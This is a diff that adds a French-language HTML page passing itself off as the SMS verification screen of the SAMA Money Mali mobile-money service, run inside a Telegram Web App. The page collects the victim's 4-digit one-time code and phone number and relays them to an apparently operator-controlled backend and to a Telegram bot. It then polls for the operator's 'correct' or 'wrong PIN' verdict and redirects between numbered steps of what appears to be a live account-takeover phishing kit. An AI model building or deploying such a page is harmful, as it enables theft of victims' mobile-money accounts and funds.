@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Code de Vérification - SAMA Money Mali</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            /* Couleurs officielles de l'application SAMA Money (Mali) */
+            --sama-blue: #0055A5;          /* Bleu principal SAMA Money */
+            --sama-blue-dark: #003E7E;     /* Bleu foncé */
+            --sama-navy: #0A2540;          /* Bleu nuit pour l'en-tête et le texte sombre */
+            --sama-gold: #F5A623;          /* Jaune/Or signature SAMA Money */
+            --bg-color: #F4F7FA;           /* Fond gris-bleu très clair */
+            --card-bg: #FFFFFF;
+            --text-dark: #0A2540;
+            --text-muted: #5A6B7C;
+            --border-color: #C5DDF5;
+            --input-bg: #EEF5FC;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Barre de navigation supérieure */
+        .app-header {
+            width: 100%;
+            background-color: transparent;
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn-top {
+            color: var(--text-dark);
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--sama-navy);
+            letter-spacing: -0.3px;
+        }
+
+        /* Conteneur principal */
+        .container {
+            width: 100%;
+            max-width: 440px;
+            margin: 10px auto 0;
+            padding: 0 24px 30px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .instruction-text {
+            font-size: 15px;
+            color: var(--text-muted);
+            margin: 10px 0 25px;
+            line-height: 1.45;
+            font-weight: 500;
+        }
+
+        /* 🚨 Bannière d'erreur rouge */
+        .error-banner {
+            width: 100%;
+            background-color: #FFF8EB;
+            border: 1px solid var(--sama-gold);
+            color: #D93025;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            text-align: center;
+            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
+        }
+
+        /* Groupe de 4 boîtes de saisie OTP interactives */
+        .otp-input-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 25px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .otp-box {
+            flex: 1;
+            min-width: 0;
+            height: 60px;
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 24px;
+            font-weight: 800;
+            text-align: center;
+            outline: none;
+            color: var(--sama-navy);
+            transition: all 0.2s ease;
+        }
+
+        .otp-box:focus {
+            border-color: var(--sama-blue);
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 85, 165, 0.15);
+        }
+
+        .otp-box.input-error {
+            border-color: #D93025;
+            background-color: #FFF9F9;
+        }
+
+        /* Section de la carte minuterie */
+        .timer-card {
+            background-color: var(--input-bg);
+            border-radius: 12px;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            width: 100%;
+            border: 1px solid var(--border-color);
+        }
+
+        .resend-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .resend-text {
+            font-size: 15px;
+            color: var(--sama-navy);
+            font-weight: 700;
+        }
+
+        .timer-countdown {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--sama-blue);
+        }
+
+        .resend-action-btn {
+            color: var(--sama-blue);
+            font-weight: 800;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 15px;
+            display: none;
+        }
+
+        /* Section des boutons */
+        .btn-confirm {
+            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
+            color: #ffffff;
+            border: none;
+            border-bottom: 3px solid var(--sama-gold);
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 14px rgba(0, 85, 165, 0.3);
+            text-transform: uppercase;
+        }
+
+        .btn-confirm:active {
+            background: var(--sama-blue-dark);
+            transform: scale(0.99);
+        }
+
+        .btn-cancel {
+            background-color: transparent;
+            color: var(--sama-blue);
+            border: none;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            text-align: center;
+            width: 100%;
+            text-decoration: underline;
+        }
+
+        /* 📱 Écran de superposition plein écran (Overlay) */
+        .overlay-status {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: var(--sama-navy);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 24px;
+            box-sizing: border-box;
+            border-top: 5px solid var(--sama-gold);
+        }
+
+        .overlay-status.active {
+            display: flex;
+        }
+
+        .overlay-spinner-circle {
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
+            border: 3px solid var(--sama-gold);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 20px rgba(0, 85, 165, 0.4);
+        }
+
+        .overlay-spinner-circle::after {
+            content: '';
+            width: 66px;
+            height: 66px;
+            border: 4px solid rgba(245, 166, 35, 0.2);
+            border-top: 4px solid var(--sama-gold);
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0 0 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .overlay-subtext {
+            color: #C5DDF5;
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 500;
+            max-width: 300px;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Barre de navigation supérieure -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">←</a>
+    <div class="header-title">Code de Vérification</div>
+</div>
+
+<div class="container">
+    <p class="instruction-text">
+        Entrez le code à 4 chiffres reçu par SMS.
+    </p>
+
+    <!-- Bannière d'erreur pour code incorrect -->
+    <div id="statusErrorContainer" class="error-banner"></div>
+
+    <form id="otpForm" onsubmit="submitOtp(event)">
+        <!-- Groupe de 4 boîtes de saisie PIN interactives -->
+        <div class="otp-input-group" id="otpGroup">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+        </div>
+
+        <!-- Carte minuterie -->
+        <div class="timer-card">
+            <div class="resend-wrapper">
+                <span class="resend-text">Renvoyer le code</span>
+            </div>
+            <div id="timerCountdown" class="timer-countdown">01:00</div>
+            <div id="resendBtn" class="resend-action-btn" onclick="resendCode()">Renvoyer le code</div>
+        </div>
+
+        <button type="submit" id="verifyBtn" class="btn-confirm">Confirmer</button>
+        <button type="button" class="btn-cancel" onclick="goBack()">Annuler</button>
+    </form>
+</div>
+
+<!-- Superposition de statut (Overlay) -->
+<div id="statusOverlay" class="overlay-status">
+    <div class="overlay-spinner-circle"></div>
+    <h2 class="overlay-title" id="overlayMainText">Veuillez patienter...</h2>
+    <p class="overlay-subtext" id="overlaySubText">Vérification du code SMS...</p>
+</div>
+
+<script>
+    const TOTAL_TIME = 60; // Minuteur d'une minute
+    let timeLeft = TOTAL_TIME;
+    let timerInterval = null;
+    let statusPollingInterval = null;
+
+    const timerCountdownEl = document.getElementById('timerCountdown');
+    const resendBtnEl = document.getElementById('resendBtn');
+    const statusErrorContainer = document.getElementById('statusErrorContainer');
+    const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
+    const otpGroup = document.getElementById('otpGroup');
+
+    // Éléments de superposition
+    const statusOverlay = document.getElementById('statusOverlay');
+    const overlayMainText = document.getElementById('overlayMainText');
+    const overlaySubText = document.getElementById('overlaySubText');
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        setupOtpInputLogic();
+        startTimer();
+    };
+
+    function setupOtpInputLogic() {
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                const val = box.value.replace(/\D/g, '');
+                box.value = val;
+
+                // Effacer le surfaçage d'erreur rouge
+                otpBoxes.forEach(b => b.classList.remove('input-error'));
+                statusErrorContainer.style.display = 'none';
+
+                if (val && index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                }
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === "Backspace") {
+                    if (!box.value && index > 0) {
+                        otpBoxes[index - 1].focus();
+                    }
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                
+                if (pastedData) {
+                    const digits = pastedData.split('').slice(0, 4);
+                    digits.forEach((digit, idx) => {
+                        if (otpBoxes[idx]) {
+                            otpBoxes[idx].value = digit;
+                        }
+                    });
+                    const nextIndex = Math.min(digits.length, 3);
+                    otpBoxes[nextIndex].focus();
+                }
+            });
+        });
+
+        // Cliquer n'importe où sur le groupe pour cibler le premier champ vide
+        otpGroup.addEventListener('click', () => {
+            const emptyBox = otpBoxes.find(b => !b.value) || otpBoxes[otpBoxes.length - 1];
+            emptyBox.focus();
+        });
+
+        // Focaliser automatiquement la première case
+        setTimeout(() => {
+            if (otpBoxes[0]) otpBoxes[0].focus();
+        }, 300);
+    }
+
+    function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        
+        timeLeft = TOTAL_TIME;
+        updateTimerDisplay();
+
+        resendBtnEl.style.display = 'none';
+        timerCountdownEl.style.display = 'block';
+
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay();
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                onTimerExpired();
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        
+        const formattedMinutes = String(minutes).padStart(2, '0');
+        const formattedSeconds = String(seconds).padStart(2, '0');
+        
+        timerCountdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+    }
+
+    function onTimerExpired() {
+        timerCountdownEl.style.display = 'none';
+        resendBtnEl.style.display = 'block';
+    }
+
+    async function resendCode() {
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+        try {
+            await fetch("/api/resend-otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, step: "First OTP (Page 8)" })
+            });
+        } catch (err) {
+            console.error("Erreur de renvoi :", err);
+        }
+        alert("Un nouveau code de vérification a été envoyé par SMS.");
+        startTimer();
+    }
+
+    async function submitOtp(event) {
+        event.preventDefault();
+
+        let codeVal = "";
+        otpBoxes.forEach(b => codeVal += b.value);
+
+        if (codeVal.length < 4) {
+            statusErrorContainer.style.display = 'block';
+            statusErrorContainer.textContent = "Code incorrect, veuillez entrer les 4 chiffres complets.";
+            otpBoxes.forEach(b => b.classList.add('input-error'));
+            return;
+        }
+
+        // Effacer l'affichage des erreurs
+        statusErrorContainer.style.display = 'none';
+        otpBoxes.forEach(b => b.classList.remove('input-error'));
+
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+
+        // Afficher l'écran d'attente
+        overlayMainText.textContent = "Veuillez patienter...";
+        overlaySubText.textContent = "Vérification du code SMS...";
+        statusOverlay.classList.add('active');
+
+        // Enregistrer l'OTP localement
+        localStorage.setItem('smsOtp1', codeVal);
+
+        // Envoyer la charge utile au backend
+        try {
+            await fetch("/api/otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
+            });
+        } catch (err) {
+            console.error("❌ Erreur de notification :", err);
+        }
+
+        const tg = window.Telegram?.WebApp;
+        if (tg && tg.sendData) {
+            tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
+        }
+
+        // Interroger le backend pour approbation ou erreur
+        startStatusPolling(phone);
+    }
+
+    function startStatusPolling(phone) {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+
+        statusPollingInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await response.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(statusPollingInterval);
+                    overlayMainText.textContent = "Code Confirmé !";
+                    overlaySubText.textContent = "Redirection en cours...";
+
+                    setTimeout(() => {
+                        window.location.href = "/page9";
+                    }, 1200);
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Afficher le message d'erreur rouge
+                    statusErrorContainer.style.display = 'block';
+                    statusErrorContainer.textContent = "Code incorrect. Veuillez entrer le code valide.";
+                    otpBoxes.forEach(b => {
+                        b.classList.add('input-error');
+                        b.value = "";
+                    });
+                    if (otpBoxes[0]) otpBoxes[0].focus();
+                }
+                else if (data.status === "otp2_wrongpin") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Rediriger vers la page 6 avec l'indicateur d'erreur
+                    window.location.href = "/page6?error=wrong_pin";
+                }
+            } catch (err) {
+                console.error("Erreur de vérification du statut :", err);
+            }
+        }, 2000);
+    }
+
+    function goBack() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+        window.location.href = "/page6";
+    }
+</script>
+
+</body>
+</html>
